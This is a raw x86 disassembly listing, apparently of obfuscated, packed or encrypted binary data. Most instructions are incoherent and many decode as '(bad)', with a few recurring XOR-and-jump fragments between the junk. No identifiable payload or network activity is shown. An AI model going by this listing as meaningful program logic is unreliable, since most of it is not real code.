  407cd8:	test   edi,ecx
  407cda:	jle    0x407d5a
  407cdc:	mov    bh,BYTE PTR [edi+0x7e]
  407cdf:	jle    0x407cd9
  407ce1:	push   edx
  407ce2:	jecxz  0x407cc2
  407ce4:	cli    
  407ce5:	mov    esp,0x7379e44b
  407cea:	jg     0x407ca9
  407cec:	dec    ebx
  407ced:	jne    0x407cd3
  407cef:	cmp    BYTE PTR [eax],bl
  407cf1:	cmp    eax,esi
  407cf3:	inc    edi
  407cf4:	and    BYTE PTR [eax+0x4a],bh
  407cf7:	and    DWORD PTR [ebx+0x6a623eb],edx
  407cfd:	std    
  407cfe:	sbb    dh,BYTE PTR ds:0xa1f6aa86
  407d04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d05:	ds inc edx
  407d08:	dec    esi
  407d09:	call   0x6274ecbf
  407d0e:	loop   0x407ca4
  407d10:	jb     0x407d18
  407d12:	loop   0x407cc6
  407d14:	jbe    0x407d50
  407d16:	push   0x6d9e704a
  407d1b:	xchg   BYTE PTR [eax-0x19],ah
  407d1e:	into   
  407d1f:	xor    BYTE PTR [esi],ah
  407d21:	cmp    al,ch
  407d23:	int    0x51
  407d25:	xchg   esp,eax
  407d26:	imul   edx,DWORD PTR [ebp+0x562e416e],0xec027325
  407d30:	inc    ecx
  407d31:	clc    
  407d32:	push   es
  407d33:	push   edi
  407d34:	pop    es
  407d35:	add    eax,0xae4121e3
  407d3a:	sbb    DWORD PTR [edx],esi
  407d3c:	jp     0x407d46
  407d3e:	clc    
  407d3f:	ds dec ebp
  407d41:	mov    esi,0xa5a18237
  407d46:	ins    DWORD PTR es:[edi],dx
  407d47:	mov    esp,DWORD PTR [ecx-0x26]
  407d4a:	sbb    BYTE PTR [edi],ah
  407d4c:	adc    ecx,esi
  407d4e:	and    cl,BYTE PTR [eax]
  407d50:	jo     0x407d1b
  407d52:	ja     0x407d87
  407d54:	(bad)  
  407d56:	rcl    DWORD PTR ds:0xffb763e0,0x9
  407d5d:	fnstsw WORD PTR [ecx]
  407d5f:	fdivr  st,st(1)
  407d61:	push   edx
  407d62:	call   0x5f1be9de
  407d67:	jg     0x407d9f
  407d69:	sub    eax,DWORD PTR [eax+edi*1]
  407d6c:	leave  
  407d6d:	mov    bh,0xdd
  407d6f:	loop   0x407d63
  407d71:	cmp    BYTE PTR [ebx-0x72],ah
  407d74:	dec    ebp
  407d75:	or     BYTE PTR [ecx-0x464a0600],bl
  407d7b:	jbe    0x407d9a
  407d7d:	and    ebx,DWORD PTR [esi]
  407d7f:	dec    edx
  407d80:	jge    0x407de5
  407d82:	popa   
  407d83:	sub    BYTE PTR [esp+eax*1+0x3b],0x64
  407d88:	lods   eax,DWORD PTR gs:[esi]
  407d8a:	out    dx,al
  407d8b:	pop    edx
  407d8c:	add    ecx,DWORD PTR [ebp-0x5f152d34]
  407d92:	fcom   QWORD PTR ds:0x979ac322
  407d98:	push   edi
  407d99:	jle    0x407d76
  407d9b:	je     0x407d71
  407d9d:	fnstsw WORD PTR [ecx+0x4f3481d3]
  407da3:	aas    
  407da4:	sti    
  407da5:	push   ss
  407da6:	shl    BYTE PTR [ecx],1
  407da8:	lahf   
  407da9:	jae    0x407dd2
  407dab:	push   0xfffffff1
  407dad:	out    dx,eax
  407dae:	push   ebp
  407daf:	cdq    
  407db0:	js     0x407d4a
  407db2:	clc    
  407db3:	sbb    BYTE PTR [ebx+0x4a70f248],ch
  407db9:	adc    al,0x64
  407dbb:	cmc    
  407dbc:	pop    ds
  407dbd:	pop    ecx
  407dbe:	ficomp WORD PTR ds:0x7bf3c390
  407dc4:	xor    al,0x57
  407dc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dc7:	or     al,0x6d
  407dc9:	or     BYTE PTR ds:0x13ff3d98,cl
  407dcf:	mov    esi,0x55435c95
  407dd4:	ret    0x139e
  407dd7:	(bad)  
  407dd8:	sbb    eax,0xfca44dcc
  407ddd:	xchg   BYTE PTR [ebp+0x6e],bh
  407de0:	hlt    
  407de1:	mov    ch,0x5e
  407de3:	(bad)  
  407de4:	pop    ss
  407de5:	pop    ds
  407de6:	jno    0x407da4
  407de8:	mov    BYTE PTR [edi+0x50],bl
  407deb:	aam    0x84
  407ded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dee:	(bad)  
  407def:	or     ecx,DWORD PTR [edx]
  407df1:	dec    edi
  407df2:	fimul  DWORD PTR [ebx+0x79aa614a]
  407df8:	ficom  WORD PTR [ecx+0x3e1e9cc9]
  407dfe:	mov    dh,0x1
  407e00:	pop    ebx
  407e01:	sub    DWORD PTR [eax+0x3d],ebx
  407e04:	sbb    BYTE PTR [edx],bl
  407e06:	sub    DWORD PTR [ebx+0x2c],ebx
  407e09:	leave  
  407e0a:	or     edx,edi
  407e0c:	cwde   
  407e0d:	loopne 0x407e70
  407e0f:	test   eax,0xf6d5b858
  407e14:	pop    edx
  407e15:	lods   al,BYTE PTR ds:[esi]
  407e16:	lods   eax,DWORD PTR ds:[esi]
  407e17:	xor    DWORD PTR ds:0xbebbb84,ebx
  407e1d:	(bad)  
  407e1e:	xor    BYTE PTR [edx],ah
  407e20:	call   0x3bbe:0x2e2e7546
  407e27:	(bad)  
  407e28:	mov    ecx,0x9d61ccbc
  407e2d:	xor    al,0xbe
  407e2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e30:	mov    dh,BYTE PTR [ecx-0x774c5fa2]
  407e36:	sub    eax,0x200099c3
  407e3b:	mov    dl,0xc9
  407e3d:	popa   
  407e3e:	mov    ds:0xc76ed088,al
  407e43:	or     ebp,esi
  407e45:	repnz sbb al,0xc6
  407e48:	retf   0x4e84
  407e4b:	mov    esp,0x9587350f
  407e50:	sbb    al,bh
  407e52:	jmp    0x407e09
  407e54:	jmp    0xca80:0x9659d833
  407e5b:	fild   WORD PTR [edi]
  407e5d:	xchg   esi,eax
  407e5e:	or     BYTE PTR [esi],ch
  407e60:	sbb    BYTE PTR [esi],ch
  407e62:	xor    BYTE PTR [edi+0x6f],ch
  407e65:	or     al,0x7b
  407e67:	push   es
  407e68:	sub    dh,ah
  407e6a:	mov    edx,DWORD PTR [esi-0x7]
  407e6d:	pushf  
  407e6e:	xchg   esp,eax
  407e6f:	or     ecx,DWORD PTR [ebx]
  407e71:	dec    eax
  407e72:	js     0x407eb6
  407e74:	ja     0x407e82
  407e7a:	mov    edx,DWORD PTR [ebp-0x2c]
  407e7d:	jmp    0x408770
  407e82:	mov    edx,DWORD PTR [ebp-0x34]
  407e85:	mov    edi,DWORD PTR [ebp-0x4]
  407e88:	xor    edx,eax
  407e8a:	xor    edi,eax
  407e8c:	jmp    0x40803d
  407e91:	(bad)  
  407e92:	in     al,dx
  407e93:	test   eax,0x4771b1f1
  407e98:	call   0x1b74fcaf
  407e9d:	push   ebx
  407e9e:	xor    edx,esi
  407ea0:	rcl    DWORD PTR [ecx],0xcd
  407ea3:	jle    0x407f23
  407ea5:	mov    bh,BYTE PTR [edi+0x7e]
  407ea8:	jle    0x407e85
  407eaa:	adc    BYTE PTR [eax],bl
  407eac:	mov    edx,0x842a5584
  407eb1:	mov    ah,0x2a
  407eb3:	outs   dx,BYTE PTR ds:[esi]
  407eb4:	sub    ebp,DWORD PTR [ebx-0x77a56001]
  407eba:	xlat   BYTE PTR ds:[ebx]
  407ebb:	xor    eax,0x77510f6c
  407ec0:	add    ah,BYTE PTR [eax]
  407ec2:	lods   al,BYTE PTR ds:[esi]
  407ec3:	test   BYTE PTR [edx-0x2be215b9],al
  407ec9:	mov    ds:0x54404e70,al
  407ece:	pushf  
  407ecf:	aas    
  407ed0:	repz cs push 0xffffffb8
  407ed4:	hlt    
  407ed5:	push   ss
  407ed6:	xacquire xchg DWORD PTR [ebx+0x5cd73fcc],ecx
  407edd:	xchg   esi,eax
  407ede:	mov    ah,0x74
  407ee0:	xor    dl,BYTE PTR [ecx+0x3d]
  407ee3:	pusha  
  407ee4:	push   esp
  407ee5:	cs (bad) 
  407ee7:	test   eax,0x9be5c579
  407eec:	mov    al,ds:0x95db2969
  407ef1:	ins    DWORD PTR es:[edi],dx
  407ef2:	pop    esi
  407ef3:	inc    ebp
  407ef4:	sub    BYTE PTR [edx],cl
  407ef6:	xor    BYTE PTR [edx+0x3f],bh
  407ef9:	push   0x29
  407efb:	mov    eax,0xebfd7b34
  407f00:	and    al,0x9
  407f02:	dec    esi
  407f03:	bound  ecx,QWORD PTR [ebp+0x8d2a706]
  407f09:	out    dx,eax
  407f0a:	xchg   esp,eax
  407f0b:	and    al,0xdf
  407f0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f0e:	or     al,0xac
  407f10:	pop    ecx
  407f11:	mov    ds:0x71eccfb2,eax
  407f16:	or     al,0x6b
  407f18:	inc    ebx
  407f19:	jne    0x407f20
  407f1b:	mov    esp,0xc69972a4
  407f20:	cld    
  407f21:	sar    BYTE PTR [ebx+0x34],cl
  407f24:	pushf  
  407f25:	inc    edx
  407f26:	dec    esi
  407f27:	push   edi
  407f28:	xor    eax,0x57b33212
  407f2d:	in     al,0x4d
  407f2f:	stc    
  407f30:	rcr    DWORD PTR [edi+0x41],cl
  407f33:	(bad)  
  407f34:	cld    
  407f35:	or     eax,0x99259d0c
  407f3a:	std    
  407f3b:	(bad)  
  407f3c:	pop    edx
  407f3d:	sbb    bl,bl
  407f3f:	jp     0x407ef1
  407f41:	in     eax,dx
  407f42:	jbe    0x407ee1
  407f44:	push   ds
  407f45:	sub    al,0xca
  407f47:	retf   
  407f48:	fldcw  WORD PTR [ebp+0x920a9b5]
  407f4e:	jb     0x407f9c
  407f50:	adc    eax,0x507b8362
  407f55:	loop   0x407f17
  407f57:	data16 xor bl,al
  407f5a:	lea    edi,[ecx-0x6d3903bd]
  407f60:	push   0x43
  407f62:	dec    edx
  407f63:	imul   eax,DWORD PTR [edx+0x31],0x33
  407f67:	jno    0x407f85
  407f69:	cmp    al,0x67
  407f6b:	cmp    BYTE PTR [ebx-0x1ae050e4],bl
  407f71:	xchg   esp,eax
  407f72:	inc    ebx
  407f73:	add    ah,BYTE PTR [edi+0x46]
  407f76:	xor    eax,0x80ac3bbf
  407f7b:	pop    ebx
  407f7c:	shl    DWORD PTR [esi-0x6c],1
  407f7f:	push   edx
  407f80:	loop   0x407f70
  407f82:	out    0xb8,al
  407f84:	push   edx
  407f85:	adc    eax,0xfd0690ef
  407f8a:	daa    
  407f8b:	dec    eax
  407f8c:	mov    esi,DWORD PTR [edx+0x782b2b0a]
  407f92:	ret    0xf0a4
  407f95:	shr    BYTE PTR [edx+0x38],1
  407f98:	aad    0xfa
  407f9a:	lods   al,BYTE PTR ds:[esi]
  407f9b:	stos   BYTE PTR es:[edi],al
  407f9c:	cmc    
  407f9d:	adc    eax,0xc8e8c84a
  407fa2:	cmp    al,0xa2
  407fa4:	daa    
  407fa5:	ds add al,0x52
  407fa8:	fild   WORD PTR [eax-0x48]
  407fab:	sbb    eax,0x30f42284
  407fb0:	hlt    
  407fb1:	push   eax
  407fb2:	dec    eax
  407fb3:	push   0xfffffffc
  407fb5:	dec    edi
  407fb6:	fimul  WORD PTR [ecx]
  407fb8:	out    0x65,eax
  407fba:	and    al,0xde
  407fbc:	in     al,0x7c
  407fbe:	cmp    bh,BYTE PTR [eax]
  407fc0:	sti    
  407fc1:	out    0x2b,al
  407fc3:	and    bp,dx
  407fc6:	adc    ah,bh
  407fc8:	inc    esp
  407fc9:	jns    0x407fc3
  407fcb:	in     eax,0x3c
  407fcd:	sub    edi,DWORD PTR [ebp-0x1]
  407fd0:	xchg   ebp,eax
  407fd1:	sbb    eax,0x10fa18d
  407fd6:	cmp    DWORD PTR [ecx],eax
  407fd8:	cmp    al,BYTE PTR [ebx+edi*2+0x5e2d69e6]
  407fdf:	add    BYTE PTR [ecx-0x4],dl
  407fe2:	pop    esp
  407fe3:	addr16 repnz mov cl,0x9c
  407fe7:	rcl    BYTE PTR [edx+0x49838441],1
  407fed:	sti    
  407fee:	arpl   WORD PTR [ebx-0x29],si
  407ff1:	cmp    eax,0x240c9fe7
  407ff6:	inc    ebp
  407ff7:	(bad)  
  407ff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ff9:	push   edi
  407ffa:	mov    ebx,DWORD PTR [edi+0x2d3edd6d]
  408000:	inc    esi
  408001:	les    esp,FWORD PTR [edi+0x62da7191]
  408007:	cmp    eax,0x4662c593
  40800c:	push   cs
  40800d:	mov    ch,0x6c
  40800f:	popf   
  408010:	xor    ah,ah
  408012:	xchg   BYTE PTR [ebx],dh
  408014:	data16 cld 
  408016:	mov    ebx,0xd7191d85
  40801b:	retf   
  40801c:	shr    BYTE PTR [ebp-0x6c],cl
  40801f:	cmc    
  408020:	sub    dh,dh
  408022:	daa    
  408023:	cmp    eax,eax
  408025:	(bad)  
  408026:	dec    edi
  408027:	lods   al,BYTE PTR ds:[esi]
  408028:	inc    esp
  408029:	pop    ebp
  40802a:	xchg   DWORD PTR [ebx-0x2a],edx
  40802d:	test   eax,0xb4773831
  408032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408033:	mov    al,0xda
  408035:	aam    0xb9
  408037:	and    ebp,0xbb74c109
  40803d:	add    edi,ecx
  40803f:	add    edx,ecx
  408041:	imul   edx,edi
  408044:	mov    edi,DWORD PTR [ebp-0x8]
  408047:	mov    ebx,DWORD PTR [ebp-0x10]
  40804a:	sub    ebx,edi
  40804c:	cmp    ebx,edx
  40804e:	ja     0x40805c
  408054:	mov    edx,DWORD PTR [ebp-0x30]
  408057:	jmp    0x408770
  40805c:	mov    edx,DWORD PTR [ebp-0x38]
  40805f:	mov    edi,DWORD PTR [ebp-0x4]
  408062:	xor    edx,eax
  408064:	xor    edi,eax
  408066:	add    edi,ecx
  408068:	jmp    0x408219
  40806d:	jmp    0x958e95d5
  408072:	push   0x185c6171
  408077:	mov    ch,0xe0
  408079:	mov    ebp,0xad8253c1
  40807e:	retf   0x7e7e
  408081:	mov    bh,BYTE PTR [edi+0x7e]
  408084:	jle    0x4080b2
  408086:	mov    ds:0x88ad73be,al
  40808b:	fldcw  WORD PTR [esi+0x61]
  40808e:	lock push cs
  408090:	out    dx,al
  408091:	lds    ecx,FWORD PTR [ebx]
  408093:	jmp    0x44a5:0x27046462
  40809a:	adc    al,0x2c
  40809c:	(bad)  
  40809d:	cmp    BYTE PTR [ebx],bh
  40809f:	stos   BYTE PTR es:[edi],al
  4080a0:	fmul   DWORD PTR [edx+ecx*2]
  4080a3:	out    dx,al
  4080a4:	xchg   ebx,eax
  4080a5:	mov    cl,bl
  4080a7:	mov    eax,0x60e43e5f
  4080ac:	inc    esp
  4080ad:	sub    dl,ah
  4080af:	push   0x3e
  4080b1:	jbe    0x408066
  4080b3:	mov    ecx,0x3f63fa09
  4080b8:	cld    
  4080b9:	nop
  4080ba:	leave  
  4080bb:	xchg   ecx,eax
  4080bc:	push   ds
  4080bd:	inc    esp
  4080be:	add    ch,ah
  4080c0:	cmp    dl,dh
  4080c2:	scas   al,BYTE PTR es:[edi]
  4080c3:	inc    ebp
  4080c4:	push   cs
  4080c5:	je     0x408100
  4080c7:	arpl   WORD PTR [bx+si+0x3f],si
  4080cb:	test   esi,edx
  4080cd:	data16 ins BYTE PTR es:[edi],dx
  4080cf:	sahf   
  4080d0:	and    al,0x68
  4080d2:	push   0xffffffac
  4080d4:	sub    al,0xd5
  4080d6:	xchg   BYTE PTR [edi+ebx*2],cl
  4080d9:	hlt    
  4080da:	sar    DWORD PTR [edx-0x19],1
  4080dd:	jne    0x4080c3
  4080df:	xor    BYTE PTR [eax-0x59],bl
  4080e2:	jne    0x4080c6
  4080e4:	loope  0x408102
  4080e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080e7:	add    eax,0xf85b8ea3
  4080ec:	aas    
  4080ed:	lds    ecx,FWORD PTR [ecx]
  4080ef:	call   0x5cb1:0xcb1113cc
  4080f6:	sti    
  4080f7:	fisub  WORD PTR [ecx]
  4080f9:	lahf   
  4080fa:	je     0x40814a
  4080fc:	pop    ds
  4080fd:	add    eax,0x1e8d5910
  408102:	pop    ss
  408103:	mov    es,WORD PTR [ecx+0x31898103]
  408109:	out    0x24,al
  40810b:	aad    0xc9
  40810d:	shr    BYTE PTR [ebx],1
  40810f:	fs or  edi,ebx
  408112:	mul    esp
  408114:	scas   al,BYTE PTR es:[edi]
  408115:	addr16 ds pop ecx
  408118:	sti    
  408119:	mov    al,0x1c
  40811b:	lods   al,BYTE PTR ds:[esi]
  40811c:	mov    ebp,0x512c570b
  408121:	lods   al,BYTE PTR ds:[esi]
  408122:	call   0xb897:0x59e3b28
  408129:	jl     0x408150
  40812b:	call   0x3b26:0x86cf7a4f
  408132:	hlt    
  408133:	(bad)  
  408134:	fs cmp al,0x43
  408137:	dec    ebx
  408138:	xor    ebp,DWORD PTR [ecx-0x89c0b92]
  40813e:	sub    al,0xb8
  408140:	sbb    BYTE PTR [ebx],0x2b
  408143:	cmp    ebx,DWORD PTR [esi-0x6]
  408146:	push   0xffffffa0
  408148:	pusha  
  408149:	jns    0x408190
  40814b:	xchg   esp,eax
  40814c:	xchg   esp,eax
  40814d:	mov    dh,0x5a
  40814f:	ret    0x29b9
  408152:	(bad)  
  408153:	mov    al,0x4b
  408155:	and    ch,ah
  408157:	inc    ebx
  408158:	(bad)  
  408159:	add    esp,DWORD PTR [esi-0x12]
  40815c:	mov    esp,0x33e45f33
  408161:	mov    esp,0x41d3b5dd
  408166:	bound  esp,QWORD PTR [ebx]
  408168:	mov    bh,0xee
  40816a:	pop    edi
  40816b:	sub    DWORD PTR [esi+0xbb593ac],0x6d
  408172:	test   eax,0xdbcc45f9
  408177:	fcomp  DWORD PTR [ebp-0x2b]
  40817a:	pop    es
  40817b:	or     BYTE PTR [esi-0x3],al
  40817e:	jae    0x40815d
  408180:	jne    0x408104
  408182:	mov    bh,0x5
  408184:	cld    
  408185:	xchg   edx,eax
  408186:	pushf  
  408187:	and    al,0x95
  408189:	stc    
  40818a:	shl    DWORD PTR [ebx+0xbc55d82],0x79
  408191:	push   0x7c
  408193:	call   0x9568debf
  408198:	push   ebp
  408199:	fucomip st,st(2)
  40819b:	inc    edx
  40819c:	fisttp QWORD PTR [ebx-0x2a]
  40819f:	test   al,0xbe
  4081a1:	dec    ebx
  4081a2:	push   eax
  4081a3:	bound  edi,QWORD PTR [ecx]
  4081a5:	pop    ds
  4081a6:	test   al,cl
  4081a8:	sbb    ch,ch
  4081aa:	fcomp  st(1)
  4081ac:	cdq    
  4081ad:	(bad)  
  4081ae:	sar    BYTE PTR [edx+0x3b430455],0x2f
  4081b5:	sbb    DWORD PTR [ebx+0x71],esi
  4081b8:	xor    ebx,edi
  4081ba:	cli    
  4081bb:	mov    BYTE PTR [ecx+0x48],dl
  4081be:	js     0x40817f
  4081c0:	inc    edx
  4081c1:	adc    eax,0x12e7b752
  4081c6:	mov    ebp,0x4ac20ed7
  4081cb:	rcr    BYTE PTR ds:0x40ec3ae3,1
  4081d1:	xchg   edi,eax
  4081d2:	jp     0x408247
  4081d4:	jecxz  0x40816e
  4081d6:	test   DWORD PTR [ebp+0x2c],ebp
  4081d9:	and    ebx,DWORD PTR [edi-0x63]
  4081dc:	lock bound ecx,QWORD PTR [eax]
  4081df:	mov    fs,eax
  4081e1:	rol    ecx,0x34
  4081e4:	jle    0x40819e
  4081e6:	sahf   
  4081e7:	pusha  
  4081e8:	jg     0x40816f
  4081ea:	add    al,0x5
  4081ec:	xchg   ebx,eax
  4081ed:	cmp    esp,ebp
  4081ef:	sub    bl,bh
  4081f1:	mov    cl,0x96
  4081f3:	or     dh,bh
  4081f5:	xor    BYTE PTR [ecx+ebx*2+0x1dd0584f],0x9c
  4081fd:	ja     0x4081b0
  4081ff:	pushf  
  408200:	jg     0x408263
  408202:	lea    esp,[esi]
  408204:	inc    ebx
  408205:	pop    ds
  408206:	pusha  
  408207:	inc    esp
  408208:	mov    WORD PTR ds:0x194cf52e,gs
  40820e:	or     bh,BYTE PTR [eax+ebp*4]
  408211:	(bad)  
  408212:	aad    0x9d
  408214:	les    esi,FWORD PTR [edi+0x36f8a09]
  40821a:	shr    ecx,1
  40821c:	lods   al,BYTE PTR ds:[esi]
  40821d:	add    DWORD PTR [eax],eax
  40821f:	add    BYTE PTR [eax+edx*1+0x3f],cl
  408223:	add    eax,DWORD PTR [ebx-0x2f]
  408226:	push   eax
  408227:	push   ecx
  408228:	jl     0x4082a4
  40822a:	jmp    0x3906:0x24516262
  408231:	enter  0x7e7e,0x8a
  408235:	jg     0x4082b5
  408237:	jle    0x408257
  408239:	jmp    0x1107718f
  40823e:	xchg   ecx,eax
  40823f:	inc    edi
  408240:	push   eax
  408241:	or     esi,0xffffffc4
  408244:	mov    al,0x37
  408246:	xor    eax,0x335b2582
  40824b:	xchg   edx,eax
  40824c:	sahf   
  40824d:	push   cs
  40824e:	and    dh,dh
  408250:	inc    edi
  408251:	pop    ebp
  408252:	xchg   BYTE PTR [edi-0x78f7eb9f],ah
  408258:	aad    0xe5
  40825a:	pusha  
  40825b:	sub    al,0x98
  40825d:	sbb    BYTE PTR [ecx],ah
  40825f:	lea    ebp,[ebx]
  408261:	push   ebx
  408262:	jo     0x408243
  408264:	mov    eax,ds:0xf996c5bc
  408269:	push   ecx
  40826a:	jmp    0xb3588948
  40826f:	jae    0x408215
  408271:	push   ebx
  408272:	out    dx,eax
  408273:	push   esp
  408274:	adc    dl,BYTE PTR [edi+edi*8]
  408277:	mov    esp,0xa197c655
  40827c:	(bad)  
  40827d:	cmp    eax,DWORD PTR [eax+0x14599b18]
  408283:	ror    DWORD PTR [edx],0x8e
  408286:	ins    DWORD PTR es:[edi],dx
  408287:	out    dx,eax
  408288:	mov    ebp,0x115081ac
  40828d:	mov    dh,0x6a
  40828f:	mov    ss,WORD PTR [eax]
  408291:	push   0xffffffc5
  408293:	mov    ds:0xb12bb994,eax
  408298:	pushf  
  408299:	ss scas al,BYTE PTR es:[edi]
  40829b:	jmp    0x408271
  40829d:	xor    eax,0xc4acb681
  4082a2:	mov    dl,0xed
  4082a4:	pop    esp
  4082a5:	dec    edi
  4082a6:	jl     0x408260
  4082a8:	fdivr  QWORD PTR [esi+0x33f3fbe7]
  4082ae:	leave  
  4082af:	out    0x22,eax
  4082b1:	in     al,dx
  4082b2:	in     al,dx
  4082b3:	cmp    DWORD PTR [ecx+0x6056342a],ecx
  4082b9:	ds cwde 
  4082bb:	xchg   ecx,eax
  4082bc:	jb     0x4082c1
  4082be:	sbb    DWORD PTR [edi],eax
  4082c0:	ja     0x4082af
  4082c2:	test   al,0xf0
  4082c4:	sti    
  4082c5:	test   al,0x4c
  4082c7:	test   bh,ch
  4082c9:	lahf   
  4082ca:	(bad)  
  4082cb:	loopne 0x4082d2
  4082cd:	dec    ebx
  4082ce:	mov    ch,0x82
  4082d0:	push   ds
  4082d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082d2:	ret    
  4082d3:	(bad)  
  4082d5:	sub    edx,ebp
  4082d7:	and    DWORD PTR [edi+0x73],esp
  4082da:	test   DWORD PTR [ebx-0x39],ecx
  4082dd:	sahf   
  4082de:	xchg   ecx,eax
  4082df:	xor    al,0xc4
  4082e1:	(bad)  
  4082e3:	arpl   WORD PTR [ebx],cx
  4082e5:	or     BYTE PTR [esi-0x34],bh
  4082e8:	inc    ebx
  4082e9:	push   edi
  4082ea:	lods   al,BYTE PTR ds:[esi]
  4082eb:	mov    ch,0xa1
  4082ed:	adc    DWORD PTR [edi+0x6166ae3],eax
  4082f3:	scas   al,BYTE PTR es:[edi]
  4082f4:	cwde   
  4082f5:	inc    BYTE PTR [ecx]
  4082f7:	out    0x63,al
  4082f9:	lods   al,BYTE PTR ds:[esi]
  4082fa:	mov    bh,0xd2
  4082fc:	fs dec esi
  4082fe:	push   cs
  4082ff:	sbb    bh,cl
  408301:	mov    al,0x18
  408303:	faddp  st(7),st
  408305:	hlt    
  408306:	imul   ecx,DWORD PTR [edx+0x246eecfc],0xffffffce
  40830d:	inc    edx
  40830e:	sub    cl,bl
  408310:	rcr    cl,1
  408312:	sub    ah,BYTE PTR [edi]
  408314:	sub    DWORD PTR [ecx+0x67beb4a0],edx
  40831a:	jmp    0x408394
  40831c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40831d:	xlat   BYTE PTR ds:[ebx]
  40831e:	or     eax,0x2d33b353
  408323:	sub    ah,BYTE PTR [ebp+ecx*2-0x55182a2f]
  40832a:	pusha  
  40832b:	xor    dl,bh
  40832d:	push   es
  40832e:	fwait
  40832f:	mov    edi,0xbf89f8f1
  408334:	sub    al,0xcc
  408336:	xchg   edi,eax
  408337:	loope  0x4082bc
  408339:	lahf   
  40833a:	out    dx,eax
  40833b:	das    
  40833c:	and    edx,DWORD PTR [ebx+0x38335fe3]
  408342:	pop    ds
  408343:	in     eax,0xa8
  408345:	mov    al,0x87
  408347:	fild   WORD PTR [ebp-0x7287efb4]
  40834d:	std    
  40834e:	sbb    eax,DWORD PTR [ebx]
  408350:	dec    esp
  408351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408352:	call   0x90181874
  408357:	lea    esi,[edi]
  408359:	mov    WORD PTR [ebx+ebp*2+0x4],es
  40835d:	sar    DWORD PTR ds:[edx+0x5a],cl
  408361:	stos   DWORD PTR es:[edi],eax
  408362:	dec    esi
  408363:	xor    DWORD PTR [eax],esi
  408365:	mov    WORD PTR [edx],fs
  408367:	jbe    0x4083bb
  408369:	mov    al,0xc6
  40836b:	adc    eax,0x2cc37d1b
  408370:	ds mov esp,0x5a2df31b
  408376:	or     ch,dh
  408378:	das    
  408379:	es inc edi
  40837b:	mov    ah,0x43
  40837d:	mov    al,0xd9
  40837f:	icebp  
  408380:	imul   edi,DWORD PTR [ecx-0x6ceaefa],0x51dd49eb
  40838a:	loopne 0x408322
  40838c:	js     0x40837d
  40838e:	call   0xebf9:0xfdaed632
  408395:	mov    bl,dl
  408397:	cmp    ch,bl
  408399:	outs   dx,DWORD PTR ds:[esi]
  40839a:	pop    esi
  40839b:	es data16 out 0xe3,al
  40839f:	and    DWORD PTR [eax+0x515f7f65],ebp
  4083a5:	jecxz  0x40833b
  4083a7:	xor    dl,BYTE PTR [eax+0xf416a74]
  4083ad:	and    BYTE PTR [ebx-0x50],dl
  4083b0:	push   0xffffffd7
  4083b2:	xchg   eax,ebx
  4083b4:	in     eax,0x8d
  4083b6:	loope  0x408387
  4083b8:	popf   
  4083b9:	call   0xeb5eb004
  4083be:	fidivr DWORD PTR [eax+0x39]
  4083c1:	ins    BYTE PTR es:[edi],dx
  4083c2:	mov    eax,gs
  4083c4:	and    ebx,DWORD PTR ss:[edx]
  4083c7:	pop    esp
  4083c8:	ja     0x4083fc
  4083ca:	ja     0x408444
  4083cc:	imul   edx,edi
  4083cf:	mov    edi,DWORD PTR [ebp-0x8]
  4083d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4083d5:	sub    ebx,edi
  4083d7:	jmp    0x408588
  4083dc:	and    BYTE PTR [ebx-0x6c4aede2],ch
  4083e2:	xor    BYTE PTR [ecx-0x29441d92],ch
  4083e8:	xor    bh,BYTE PTR [edx-0x53]
  4083eb:	sub    al,0x55
  4083ed:	leave  
  4083ee:	jle    0x40846e
  4083f0:	mov    bh,BYTE PTR [edi+0x7e]
  4083f3:	jle    0x4083b6
  4083f5:	sub    al,0x8f
  4083f7:	cli    
  4083f8:	and    eax,0x671e87d2
  4083fd:	jae    0x4083a8
  4083ff:	(bad)  
  408400:	mov    ah,0x7a
  408402:	es jno 0x408480
  408405:	adc    edi,edx
  408407:	(bad)  [ebx]
  408409:	cli    
  40840a:	jmp    0x65f2:0xde5a1725
  408411:	dec    esp
  408412:	jg     0x40843f
  408414:	inc    eax
  408415:	mov    ds:0x591f61bd,eax
  40841a:	gs xchg ecx,eax
  40841c:	cwde   
  40841d:	popf   
  40841e:	or     DWORD PTR [eax-0x89aeeed],0xcf751b31
  408428:	popa   
  408429:	or     edi,DWORD PTR [edx+0x4d]
  40842c:	dec    edx
  40842d:	xor    eax,0xb42dd6fc
  408433:	add    edx,DWORD PTR [eax+0x13]
  408436:	lahf   
  408437:	xchg   edi,eax
  408438:	mov    bh,0x5a
  40843a:	sbb    DWORD PTR [esi+0x892230b],ecx
  408440:	xor    al,0xfb
  408442:	mov    eax,0x276e392f
  408447:	xor    dh,bh
  408449:	std    
  40844a:	pop    ebx
  40844b:	icebp  
  40844c:	sbb    DWORD PTR [eax+0x467b2de0],ecx
  408452:	push   cs
  408453:	xchg   edi,eax
  408454:	sub    bl,BYTE PTR [esi+0x1f]
  408457:	push   ecx
  408458:	cmp    eax,0xbdbe8e61
  40845d:	push   es
  40845e:	sub    al,0x3c
  408460:	sub    bh,dh
  408462:	cld    
  408463:	js     0x408469
  408465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408466:	sub    ebp,ecx
  408468:	cmp    DWORD PTR [esi+edx*8+0x66e8cb30],0xffffffa1
  408470:	push   esi
  408471:	into   
  408472:	inc    esp
  408473:	jnp    0x4084b6
  408475:	dec    esp
  408476:	mov    esi,0xf312228a
  40847b:	loopne 0x408449
  40847d:	fdiv   QWORD PTR [edx]
  40847f:	pop    edx
  408480:	stos   BYTE PTR es:[edi],al
  408481:	or     dh,bl
  408483:	jo     0x40848e
  408485:	push   edx
  408486:	or     ebp,DWORD PTR [ebp+0x56]
  408489:	mov    esp,0x1fea00e4
  40848e:	mov    ecx,0xe5f4fe01
  408493:	inc    ecx
  408494:	mov    ds:0xa8fee614,eax
  408499:	jmp    0x9af74d50
